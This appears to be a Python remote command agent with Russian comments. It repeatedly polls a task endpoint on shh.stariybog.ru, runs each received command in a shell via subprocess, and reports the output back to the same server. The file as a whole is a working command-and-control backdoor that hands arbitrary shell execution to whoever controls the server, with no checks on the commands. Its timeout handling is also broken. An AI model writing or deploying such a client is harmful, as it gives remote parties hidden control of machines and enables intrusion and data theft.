import requests
import json
import subprocess
import threading
import time
import os

def command_executor(command, result_container, timeout_event):
	try:
		# Запускаем команду
		encoding = os.device_encoding(1)
		process = subprocess.run(command.split(), shell=True, capture_output=True, text=True, encoding=encoding)
		
		# Ждем завершения процесса или таймаута
		start_time = time.time()
			
		result_container['result'] = process.stdout if process.returncode == 0 else process.stderr
		result_container['error'] = 0 if process.returncode == 0 else 1
		return
		

	except Exception as e:
		result_container['result'] = str(e)
		result_container['error'] = 1

def run_command_in_thread(command, timeout):
	result_container = {'result': '', 'error': None}
	timeout_event = threading.Event()
	
	thread = threading.Thread(target=command_executor, args=(command, result_container, timeout_event))
	thread.start()
	gg = time.time()
	while True:
		if time.time()-gg > 10:
			result_container['result'] = "TimeError"
			result_container['error'] = 1
			break
		if not thread.is_alive():
			break

		time.sleep(0.1)

	return result_container['result'], result_container['error']

def main_parser(cfg_data):
	print('never gonna give u up')
	command_executor("chcp 65001", {'result': '', 'error': None}, threading.Event())

	while True:
		try:
			r = requests.get("https://shh.stariybog.ru/taskpoll?auth_key={}&wait_time=25".format(cfg_data['code']))
			data = json.loads(r.content)
		except: 
			time.sleep(10)
			continue

		for i in data:
			if i['is_fast']:
				fast_id = i['fast_id']
				fast_task = [i for i in json.loads(requests.get("https://shh.stariybog.ru/fasttasks").content) if i[0] == fast_id][0]
				i['command'] = fast_task[2]
			print(i['command'])
			response = run_command_in_thread(i['command'], timeout=10)  # Задаем таймаут в секундах
			r = requests.get('https://shh.stariybog.ru/complete_task?auth_key={}'.format(cfg_data['code']),
				params={
					'error': response[1],
					'result': response[0],
					'task_id': i['id']
				}
			)	
			#print(response)
			#print(r, r.url)

